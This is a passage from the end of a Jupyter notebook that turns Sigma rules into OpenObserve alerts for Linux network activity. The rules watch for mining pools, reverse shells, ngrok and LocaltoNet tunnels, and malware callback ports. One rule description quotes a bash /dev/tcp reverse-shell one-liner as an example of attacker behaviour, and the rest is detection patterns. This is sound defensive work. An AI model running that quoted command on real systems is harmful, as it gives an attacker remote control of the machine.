        "# res_to_alerts = [ os.environ[\"HOME\"] + '/tmp/sigma/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml']"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T21:04:39.540228Z",
          "iopub.status.busy": "2025-07-06T21:04:39.540045Z",
          "iopub.status.idle": "2025-07-06T21:04:42.370602Z",
          "shell.execute_reply": "2025-07-06T21:04:42.370173Z",
          "shell.execute_reply.started": "2025-07-06T21:04:39.540213Z"
        }
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "=> Processing rule file /home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_crypto_mining_indicators.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_crypto_mining_indicators.yml\n",
            "```(type <class 'str'>: {\"name\": \"Linux_Crypto_Mining_Pool_Connections\", \"org_id\": \"default\", \"stream_type\": \"logs\", \"stream_name\": \"kunai\", \"is_real_time\": false, \"query_condition\": {\"type\": \"sql\", \"conditions\": [], \"sql\": \"SELECT data_command_line,data_exe_path,info_event_name,info_parent_task_name,info_task_name,info_task_uid FROM \\\"kunai\\\" WHERE info_event_name='connect' AND (data_dst_hostname='pool.minexmr.com' OR data_dst_hostname='fr.minexmr.com' OR data_dst_hostname='de.minexmr.com' OR data_dst_hostname='sg.minexmr.com' OR data_dst_hostname='ca.minexmr.com' OR data_dst_hostname='us-west.minexmr.com' OR data_dst_hostname='pool.supportxmr.com' OR data_dst_hostname='mine.c3pool.com' OR data_dst_hostname='xmr-eu1.nanopool.org' OR data_dst_hostname='xmr-eu2.nanopool.org' OR data_dst_hostname='xmr-us-east1.nanopool.org' OR data_dst_hostname='xmr-us-west1.nanopool.org' OR data_dst_hostname='xmr-asia1.nanopool.org' OR data_dst_hostname='xmr-jp1.nanopool.org' OR data_dst_hostname='xmr-au1.nanopool.org' OR data_dst_hostname='xmr.2miners.com' OR data_dst_hostname='xmr.hashcity.org' OR data_dst_hostname='xmr.f2pool.com' OR data_dst_hostname='xmrpool.eu' OR data_dst_hostname='pool.hashvault.pro' OR data_dst_hostname='moneroocean.stream' OR data_dst_hostname='monerocean.stream')\", \"multi_time_range\": []}, \"trigger_condition\": {\"period\": 60, \"operator\": \">=\", \"threshold\": 3, \"frequency\": 60, \"cron\": \"\", \"frequency_type\": \"minutes\", \"silence\": 240, \"timezone\": \"UTC\"}, \"destinations\": [\"alert-destination-email\"], \"context_attributes\": {}, \"row_template\": \"\", \"description\": \"Detects process connections to a Monero crypto mining pool\\nid: a46c93b7-55ed-4d27-a41b-c259456c4746\\nlevel: high\\nstatus: stable\\nauthor: Florian Roth (Nextron Systems)\", \"enabled\": true, \"tz_offset\": 0, \"owner\": \"root@example.com\", \"folder_id\": \"7345466173472901005\"}```\n",
            "'https://mlopenobserve004.internal/api/v2/default/alerts'\n",
            "('Update object alerts url: '\n",
            " 'https://mlopenobserve004.internal/api/v2/default/alerts/2zFCHStmsEsKXsTWToeh9ioejEd')\n",
            "(\"Update object json input: {'name': 'Linux_Crypto_Mining_Pool_Connections', \"\n",
            " \"'org_id': 'default', 'stream_type': 'logs', 'stream_name': 'kunai', \"\n",
            " \"'is_real_time': False, 'query_condition': {'type': 'sql', 'conditions': [], \"\n",
            " \"'sql': 'SELECT \"\n",
            " 'data_command_line,data_exe_path,info_event_name,info_parent_task_name,info_task_name,info_task_uid '\n",
            " 'FROM \"kunai\" WHERE info_event_name=\\\\\\'connect\\\\\\' AND '\n",
            " \"(data_dst_hostname=\\\\'pool.minexmr.com\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'fr.minexmr.com\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'de.minexmr.com\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'sg.minexmr.com\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'ca.minexmr.com\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'us-west.minexmr.com\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'pool.supportxmr.com\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'mine.c3pool.com\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'xmr-eu1.nanopool.org\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'xmr-eu2.nanopool.org\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'xmr-us-east1.nanopool.org\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'xmr-us-west1.nanopool.org\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'xmr-asia1.nanopool.org\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'xmr-jp1.nanopool.org\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'xmr-au1.nanopool.org\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'xmr.2miners.com\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'xmr.hashcity.org\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'xmr.f2pool.com\\\\' OR data_dst_hostname=\\\\'xmrpool.eu\\\\' \"\n",
            " \"OR data_dst_hostname=\\\\'pool.hashvault.pro\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'moneroocean.stream\\\\' OR \"\n",
            " \"data_dst_hostname=\\\\'monerocean.stream\\\\')', 'multi_time_range': []}, \"\n",
            " \"'trigger_condition': {'period': 60, 'operator': '>=', 'threshold': 3, \"\n",
            " \"'frequency': 60, 'cron': '', 'frequency_type': 'minutes', 'silence': 240, \"\n",
            " \"'timezone': 'UTC'}, 'destinations': ['alert-destination-email'], \"\n",
            " \"'context_attributes': {}, 'row_template': '', 'description': 'Detects \"\n",
            " 'process connections to a Monero crypto mining pool\\\\nid: '\n",
            " 'a46c93b7-55ed-4d27-a41b-c259456c4746\\\\nlevel: high\\\\nstatus: '\n",
            " \"stable\\\\nauthor: Florian Roth (Nextron Systems)', 'enabled': True, \"\n",
            " \"'tz_offset': 0, 'owner': 'root@example.com', 'folder_id': \"\n",
            " \"'7345466173472901005', 'alert_id': '2zFCHStmsEsKXsTWToeh9ioejEd'}\")\n",
            "'Update object completed'\n",
            "'Create/update by name updated 1 object(s).'\n",
            "=> Processing rule file /home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml\n",
            "```(type <class 'str'>: {\"name\": \"Linux_Reverse_Shell_Indicator\", \"org_id\": \"default\", \"stream_type\": \"logs\", \"stream_name\": \"kunai\", \"is_real_time\": false, \"query_condition\": {\"type\": \"sql\", \"conditions\": [], \"sql\": \"SELECT data_command_line,data_exe_path,info_event_name,info_parent_task_name,info_task_name,info_task_uid FROM \\\"kunai\\\" WHERE info_event_name='connect' AND (data_exe_path LIKE '%/bin/bash' AND (NOT (data_dst_ip='127.0.0.1' OR data_dst_ip='0.0.0.0')))\", \"multi_time_range\": []}, \"trigger_condition\": {\"period\": 60, \"operator\": \">=\", \"threshold\": 3, \"frequency\": 60, \"cron\": \"\", \"frequency_type\": \"minutes\", \"silence\": 240, \"timezone\": \"UTC\"}, \"destinations\": [\"alert-destination-email\"], \"context_attributes\": {}, \"row_template\": \"\", \"description\": \"Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')\\nid: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871\\nlevel: critical\\nstatus: test\\nauthor: Florian Roth (Nextron Systems)\", \"enabled\": true, \"tz_offset\": 0, \"owner\": \"root@example.com\", \"folder_id\": \"7345466173472901005\"}```\n",
            "'https://mlopenobserve004.internal/api/v2/default/alerts'\n",
            "('Update object alerts url: '\n",
            " 'https://mlopenobserve004.internal/api/v2/default/alerts/2zFCHTzGpLLS6nABOFWDSmU4ayE')\n",
            "(\"Update object json input: {'name': 'Linux_Reverse_Shell_Indicator', \"\n",
            " \"'org_id': 'default', 'stream_type': 'logs', 'stream_name': 'kunai', \"\n",
            " \"'is_real_time': False, 'query_condition': {'type': 'sql', 'conditions': [], \"\n",
            " \"'sql': 'SELECT \"\n",
            " 'data_command_line,data_exe_path,info_event_name,info_parent_task_name,info_task_name,info_task_uid '\n",
            " 'FROM \"kunai\" WHERE info_event_name=\\\\\\'connect\\\\\\' AND (data_exe_path LIKE '\n",
            " \"\\\\'%/bin/bash\\\\' AND (NOT (data_dst_ip=\\\\'127.0.0.1\\\\' OR \"\n",
            " \"data_dst_ip=\\\\'0.0.0.0\\\\')))', 'multi_time_range': []}, 'trigger_condition': \"\n",
            " \"{'period': 60, 'operator': '>=', 'threshold': 3, 'frequency': 60, 'cron': \"\n",
            " \"'', 'frequency_type': 'minutes', 'silence': 240, 'timezone': 'UTC'}, \"\n",
            " \"'destinations': ['alert-destination-email'], 'context_attributes': {}, \"\n",
            " '\\'row_template\\': \\'\\', \\'description\\': \"Detects a bash contecting to a '\n",
            " \"remote IP address (often found when actors do something like 'bash -i >& \"\n",
            " \"/dev/tcp/10.0.0.1/4242 0>&1')\\\\nid: \"\n",
            " '83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871\\\\nlevel: critical\\\\nstatus: '\n",
            " 'test\\\\nauthor: Florian Roth (Nextron Systems)\", \\'enabled\\': True, '\n",
            " \"'tz_offset': 0, 'owner': 'root@example.com', 'folder_id': \"\n",
            " \"'7345466173472901005', 'alert_id': '2zFCHTzGpLLS6nABOFWDSmU4ayE'}\")\n",
            "'Update object completed'\n",
            "'Create/update by name updated 1 object(s).'\n",
            "=> Processing rule file /home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_domain_localtonet_tunnel.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_domain_localtonet_tunnel.yml\n",
            "```(type <class 'str'>: {\"name\": \"Communication_To_LocaltoNet_Tunneling_Service_Initiated_-_Linux\", \"org_id\": \"default\", \"stream_type\": \"logs\", \"stream_name\": \"kunai\", \"is_real_time\": false, \"query_condition\": {\"type\": \"sql\", \"conditions\": [], \"sql\": \"SELECT data_command_line,data_exe_path,info_event_name,info_parent_task_name,info_task_name,info_task_uid FROM \\\"kunai\\\" WHERE info_event_name='connect' AND (data_dst_hostname LIKE '%.localto.net' OR data_dst_hostname LIKE '%.localtonet.com')\", \"multi_time_range\": []}, \"trigger_condition\": {\"period\": 60, \"operator\": \">=\", \"threshold\": 3, \"frequency\": 60, \"cron\": \"\", \"frequency_type\": \"minutes\", \"silence\": 240, \"timezone\": \"UTC\"}, \"destinations\": [\"alert-destination-email\"], \"context_attributes\": {}, \"row_template\": \"\", \"description\": \"Detects an executable initiating a network connection to \\\"LocaltoNet\\\" tunneling sub-domains.\\nLocaltoNet is a reverse proxy that enables localhost services to be exposed to the Internet.\\nAttackers have been seen to use this service for command-and-control activities to bypass MFA and perimeter controls.\\n\\nid: c4568f5d-131f-4e78-83d4-45b2da0ec4f1\\nlevel: high\\nstatus: test\\nauthor: Andreas Braathen (mnemonic.io)\", \"enabled\": true, \"tz_offset\": 0, \"owner\": \"root@example.com\", \"folder_id\": \"7345466173472901005\"}```\n",
            "'https://mlopenobserve004.internal/api/v2/default/alerts'\n",
            "('Update object alerts url: '\n",
            " 'https://mlopenobserve004.internal/api/v2/default/alerts/2zFCHY6CT7uNRXIwVPcaC8R49dg')\n",
            "(\"Update object json input: {'name': \"\n",
            " \"'Communication_To_LocaltoNet_Tunneling_Service_Initiated_-_Linux', 'org_id': \"\n",
            " \"'default', 'stream_type': 'logs', 'stream_name': 'kunai', 'is_real_time': \"\n",
            " \"False, 'query_condition': {'type': 'sql', 'conditions': [], 'sql': 'SELECT \"\n",
            " 'data_command_line,data_exe_path,info_event_name,info_parent_task_name,info_task_name,info_task_uid '\n",
            " 'FROM \"kunai\" WHERE info_event_name=\\\\\\'connect\\\\\\' AND (data_dst_hostname '\n",
            " \"LIKE \\\\'%.localto.net\\\\' OR data_dst_hostname LIKE \\\\'%.localtonet.com\\\\')', \"\n",
            " \"'multi_time_range': []}, 'trigger_condition': {'period': 60, 'operator': \"\n",
            " \"'>=', 'threshold': 3, 'frequency': 60, 'cron': '', 'frequency_type': \"\n",
            " \"'minutes', 'silence': 240, 'timezone': 'UTC'}, 'destinations': \"\n",
            " \"['alert-destination-email'], 'context_attributes': {}, 'row_template': '', \"\n",
            " \"'description': 'Detects an executable initiating a network connection to \"\n",
            " '\"LocaltoNet\" tunneling sub-domains.\\\\nLocaltoNet is a reverse proxy that '\n",
            " 'enables localhost services to be exposed to the Internet.\\\\nAttackers have '\n",
            " 'been seen to use this service for command-and-control activities to bypass '\n",
            " 'MFA and perimeter controls.\\\\n\\\\nid: '\n",
            " 'c4568f5d-131f-4e78-83d4-45b2da0ec4f1\\\\nlevel: high\\\\nstatus: test\\\\nauthor: '\n",
            " \"Andreas Braathen (mnemonic.io)', 'enabled': True, 'tz_offset': 0, 'owner': \"\n",
            " \"'root@example.com', 'folder_id': '7345466173472901005', 'alert_id': \"\n",
            " \"'2zFCHY6CT7uNRXIwVPcaC8R49dg'}\")\n",
            "'Update object completed'\n",
            "'Create/update by name updated 1 object(s).'\n",
            "=> Processing rule file /home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_susp_malware_callback_port.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_susp_malware_callback_port.yml\n",
            "```(type <class 'str'>: {\"name\": \"Potentially_Suspicious_Malware_Callback_Communication_-_Linux\", \"org_id\": \"default\", \"stream_type\": \"logs\", \"stream_name\": \"kunai\", \"is_real_time\": false, \"query_condition\": {\"type\": \"sql\", \"conditions\": [], \"sql\": \"SELECT data_command_line,data_exe_path,info_event_name,info_parent_task_name,info_task_name,info_task_uid FROM \\\"kunai\\\" WHERE info_event_name='connect' AND ((data_dst_port=888 OR data_dst_port=999 OR data_dst_port=2200 OR data_dst_port=2222 OR data_dst_port=4000 OR data_dst_port=4444 OR data_dst_port=6789 OR data_dst_port=8531 OR data_dst_port=50501 OR data_dst_port=51820) AND (NOT (data_dst_ip LIKE '127.%' OR data_dst_ip LIKE '10.%' OR data_dst_ip LIKE '172.16.%' OR data_dst_ip LIKE '172.17.%' OR data_dst_ip LIKE '172.18.%' OR data_dst_ip LIKE '172.19.%' OR data_dst_ip LIKE '172.20.%' OR data_dst_ip LIKE '172.21.%' OR data_dst_ip LIKE '172.22.%' OR data_dst_ip LIKE '172.23.%' OR data_dst_ip LIKE '172.24.%' OR data_dst_ip LIKE '172.25.%' OR data_dst_ip LIKE '172.26.%' OR data_dst_ip LIKE '172.27.%' OR data_dst_ip LIKE '172.28.%' OR data_dst_ip LIKE '172.29.%' OR data_dst_ip LIKE '172.30.%' OR data_dst_ip LIKE '172.31.%' OR data_dst_ip LIKE '192.168.%' OR data_dst_ip LIKE '169.254.%' OR data_dst_ip='::1/128' OR data_dst_ip LIKE 'fe8%' OR data_dst_ip LIKE 'fe9%' OR data_dst_ip LIKE 'fea%' OR data_dst_ip LIKE 'feb%' OR data_dst_ip LIKE 'fc%' OR data_dst_ip LIKE 'fd%')))\", \"multi_time_range\": []}, \"trigger_condition\": {\"period\": 60, \"operator\": \">=\", \"threshold\": 3, \"frequency\": 60, \"cron\": \"\", \"frequency_type\": \"minutes\", \"silence\": 240, \"timezone\": \"UTC\"}, \"destinations\": [\"alert-destination-email\"], \"context_attributes\": {}, \"row_template\": \"\", \"description\": \"Detects programs that connect to known malware callback ports based on threat intelligence reports.\\n\\nid: dbfc7c98-04ab-4ab7-aa94-c74d22aa7376\\nlevel: high\\nstatus: test\\nauthor: hasselj\", \"enabled\": true, \"tz_offset\": 0, \"owner\": \"root@example.com\", \"folder_id\": \"7345466173472901005\"}```\n",
            "'https://mlopenobserve004.internal/api/v2/default/alerts'\n",
            "('Update object alerts url: '\n",
            " 'https://mlopenobserve004.internal/api/v2/default/alerts/2zFCHjNlbqqGqFG5H6pZtKhkTEK')\n",
            "(\"Update object json input: {'name': \"\n",
            " \"'Potentially_Suspicious_Malware_Callback_Communication_-_Linux', 'org_id': \"\n",
            " \"'default', 'stream_type': 'logs', 'stream_name': 'kunai', 'is_real_time': \"\n",
            " \"False, 'query_condition': {'type': 'sql', 'conditions': [], 'sql': 'SELECT \"\n",
            " 'data_command_line,data_exe_path,info_event_name,info_parent_task_name,info_task_name,info_task_uid '\n",
            " 'FROM \"kunai\" WHERE info_event_name=\\\\\\'connect\\\\\\' AND ((data_dst_port=888 '\n",
            " 'OR data_dst_port=999 OR data_dst_port=2200 OR data_dst_port=2222 OR '\n",
            " 'data_dst_port=4000 OR data_dst_port=4444 OR data_dst_port=6789 OR '\n",
            " 'data_dst_port=8531 OR data_dst_port=50501 OR data_dst_port=51820) AND (NOT '\n",
            " \"(data_dst_ip LIKE \\\\'127.%\\\\' OR data_dst_ip LIKE \\\\'10.%\\\\' OR data_dst_ip \"\n",
            " \"LIKE \\\\'172.16.%\\\\' OR data_dst_ip LIKE \\\\'172.17.%\\\\' OR data_dst_ip LIKE \"\n",
            " \"\\\\'172.18.%\\\\' OR data_dst_ip LIKE \\\\'172.19.%\\\\' OR data_dst_ip LIKE \"\n",
            " \"\\\\'172.20.%\\\\' OR data_dst_ip LIKE \\\\'172.21.%\\\\' OR data_dst_ip LIKE \"\n",
            " \"\\\\'172.22.%\\\\' OR data_dst_ip LIKE \\\\'172.23.%\\\\' OR data_dst_ip LIKE \"\n",
            " \"\\\\'172.24.%\\\\' OR data_dst_ip LIKE \\\\'172.25.%\\\\' OR data_dst_ip LIKE \"\n",
            " \"\\\\'172.26.%\\\\' OR data_dst_ip LIKE \\\\'172.27.%\\\\' OR data_dst_ip LIKE \"\n",
            " \"\\\\'172.28.%\\\\' OR data_dst_ip LIKE \\\\'172.29.%\\\\' OR data_dst_ip LIKE \"\n",
            " \"\\\\'172.30.%\\\\' OR data_dst_ip LIKE \\\\'172.31.%\\\\' OR data_dst_ip LIKE \"\n",
            " \"\\\\'192.168.%\\\\' OR data_dst_ip LIKE \\\\'169.254.%\\\\' OR \"\n",
            " \"data_dst_ip=\\\\'::1/128\\\\' OR data_dst_ip LIKE \\\\'fe8%\\\\' OR data_dst_ip LIKE \"\n",
            " \"\\\\'fe9%\\\\' OR data_dst_ip LIKE \\\\'fea%\\\\' OR data_dst_ip LIKE \\\\'feb%\\\\' OR \"\n",
            " \"data_dst_ip LIKE \\\\'fc%\\\\' OR data_dst_ip LIKE \\\\'fd%\\\\')))', \"\n",
            " \"'multi_time_range': []}, 'trigger_condition': {'period': 60, 'operator': \"\n",
            " \"'>=', 'threshold': 3, 'frequency': 60, 'cron': '', 'frequency_type': \"\n",
            " \"'minutes', 'silence': 240, 'timezone': 'UTC'}, 'destinations': \"\n",
            " \"['alert-destination-email'], 'context_attributes': {}, 'row_template': '', \"\n",
            " \"'description': 'Detects programs that connect to known malware callback \"\n",
            " 'ports based on threat intelligence reports.\\\\n\\\\nid: '\n",
            " 'dbfc7c98-04ab-4ab7-aa94-c74d22aa7376\\\\nlevel: high\\\\nstatus: test\\\\nauthor: '\n",
            " \"hasselj', 'enabled': True, 'tz_offset': 0, 'owner': 'root@example.com', \"\n",
            " \"'folder_id': '7345466173472901005', 'alert_id': \"\n",
            " \"'2zFCHjNlbqqGqFG5H6pZtKhkTEK'}\")\n",
            "'Update object completed'\n",
            "'Create/update by name updated 1 object(s).'\n",
            "=> Processing rule file /home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_ngrok_tunnel.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_ngrok_tunnel.yml\n",
            "```(type <class 'str'>: {\"name\": \"Communication_To_Ngrok_Tunneling_Service_-_Linux\", \"org_id\": \"default\", \"stream_type\": \"logs\", \"stream_name\": \"kunai\", \"is_real_time\": false, \"query_condition\": {\"type\": \"sql\", \"conditions\": [], \"sql\": \"SELECT data_command_line,data_exe_path,info_event_name,info_parent_task_name,info_task_name,info_task_uid FROM \\\"kunai\\\" WHERE info_event_name='connect' AND (data_dst_hostname LIKE '%tunnel.us.ngrok.com%' OR data_dst_hostname LIKE '%tunnel.eu.ngrok.com%' OR data_dst_hostname LIKE '%tunnel.ap.ngrok.com%' OR data_dst_hostname LIKE '%tunnel.au.ngrok.com%' OR data_dst_hostname LIKE '%tunnel.sa.ngrok.com%' OR data_dst_hostname LIKE '%tunnel.jp.ngrok.com%' OR data_dst_hostname LIKE '%tunnel.in.ngrok.com%')\", \"multi_time_range\": []}, \"trigger_condition\": {\"period\": 60, \"operator\": \">=\", \"threshold\": 3, \"frequency\": 60, \"cron\": \"\", \"frequency_type\": \"minutes\", \"silence\": 240, \"timezone\": \"UTC\"}, \"destinations\": [\"alert-destination-email\"], \"context_attributes\": {}, \"row_template\": \"\", \"description\": \"Detects an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors\\nid: 19bf6fdb-7721-4f3d-867f-53467f6a5db6\\nlevel: high\\nstatus: test\\nauthor: Florian Roth (Nextron Systems)\", \"enabled\": true, \"tz_offset\": 0, \"owner\": \"root@example.com\", \"folder_id\": \"7345466173472901005\"}```\n",
            "'https://mlopenobserve004.internal/api/v2/default/alerts'\n",
            "('Update object alerts url: '\n",
            " 'https://mlopenobserve004.internal/api/v2/default/alerts/2zFCHpWQZqmjbP2MstjMrl62BRX')\n",
            "(\"Update object json input: {'name': \"\n",
            " \"'Communication_To_Ngrok_Tunneling_Service_-_Linux', 'org_id': 'default', \"\n",
            " \"'stream_type': 'logs', 'stream_name': 'kunai', 'is_real_time': False, \"\n",
            " \"'query_condition': {'type': 'sql', 'conditions': [], 'sql': 'SELECT \"\n",
            " 'data_command_line,data_exe_path,info_event_name,info_parent_task_name,info_task_name,info_task_uid '\n",
            " 'FROM \"kunai\" WHERE info_event_name=\\\\\\'connect\\\\\\' AND (data_dst_hostname '\n",
            " \"LIKE \\\\'%tunnel.us.ngrok.com%\\\\' OR data_dst_hostname LIKE \"\n",
            " \"\\\\'%tunnel.eu.ngrok.com%\\\\' OR data_dst_hostname LIKE \"\n",
            " \"\\\\'%tunnel.ap.ngrok.com%\\\\' OR data_dst_hostname LIKE \"\n",
            " \"\\\\'%tunnel.au.ngrok.com%\\\\' OR data_dst_hostname LIKE \"\n",
            " \"\\\\'%tunnel.sa.ngrok.com%\\\\' OR data_dst_hostname LIKE \"\n",
            " \"\\\\'%tunnel.jp.ngrok.com%\\\\' OR data_dst_hostname LIKE \"\n",
            " \"\\\\'%tunnel.in.ngrok.com%\\\\')', 'multi_time_range': []}, 'trigger_condition': \"\n",
            " \"{'period': 60, 'operator': '>=', 'threshold': 3, 'frequency': 60, 'cron': \"\n",
            " \"'', 'frequency_type': 'minutes', 'silence': 240, 'timezone': 'UTC'}, \"\n",
            " \"'destinations': ['alert-destination-email'], 'context_attributes': {}, \"\n",
            " \"'row_template': '', 'description': 'Detects an executable accessing an ngrok \"\n",
            " 'tunneling endpoint, which could be a sign of forbidden exfiltration of data '\n",
            " 'exfiltration by malicious actors\\\\nid: '\n",
            " '19bf6fdb-7721-4f3d-867f-53467f6a5db6\\\\nlevel: high\\\\nstatus: test\\\\nauthor: '\n",
            " \"Florian Roth (Nextron Systems)', 'enabled': True, 'tz_offset': 0, 'owner': \"\n",
            " \"'root@example.com', 'folder_id': '7345466173472901005', 'alert_id': \"\n",
            " \"'2zFCHpWQZqmjbP2MstjMrl62BRX'}\")\n",
            "'Update object completed'\n",
            "'Create/update by name updated 1 object(s).'\n"
          ]
        }
      ],
      "source": [
        "for rule_f in res_to_alerts:\n",
        "    convert_rule2alert(\n",
        "        openobserve_prov_direct,\n",
        "        rule_f,\n",
        "        pipeline_f,\n",
        "        \"kunai\",\n",
        "        \"root@example.com\",\n",
        "        \"alert-destination-email\",\n",
        "        openobserve_backend,\n",
        "        folderid=target_folder_id,\n",
        "        verbosity=2,\n",
        "        overwrite=True,\n",
        "    )"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": []
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": []
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "## References\n",
        "\n",
        "- [OpenObserve REST API](https://openobserve.ai/docs/api/)\n",
        "- [Unofficial python-openobserve module](https://github.com/JustinGuese/python-openobserve) with some customizations and enhancements (>=0.3)\n",
        "- Openobserve github discussions: https://github.com/openobserve/openobserve/discussions/"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": []
    }
  ],
  "metadata": {
    "hide_input": false,
    "kernelspec": {
      "display_name": "Python 3 (ipykernel)",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.13.5"
    },
    "toc": {
      "base_numbering": 1,
      "nav_menu": {},
      "number_sections": false,
      "sideBar": true,
      "skip_h1_title": false,
      "title_cell": "Table of Contents",
      "title_sidebar": "Contents",
      "toc_cell": false,
      "toc_position": {
        "height": "calc(100% - 180px)",
        "left": "10px",
        "top": "150px",
        "width": "185.554px"
      },
      "toc_section_display": true,
      "toc_window_display": true
    },
    "varInspector": {
      "cols": {
        "lenName": 16,
        "lenType": 16,
        "lenVar": 40
      },
      "kernels_config": {
        "python": {
          "delete_cmd_postfix": "",
          "delete_cmd_prefix": "del ",
          "library": "var_list.py",
          "varRefreshCmd": "print(var_dic_list())"
        },
        "r": {
          "delete_cmd_postfix": ") ",
          "delete_cmd_prefix": "rm(",
          "library": "var_list.r",
          "varRefreshCmd": "cat(var_dic_list()) "
        }
      },
      "types_to_exclude": [
        "module",
        "function",
        "builtin_function_or_method",
        "instance",
        "_Feature"
      ],
      "window_display": false
    }
  },
  "nbformat": 4,
  "nbformat_minor": 4
}
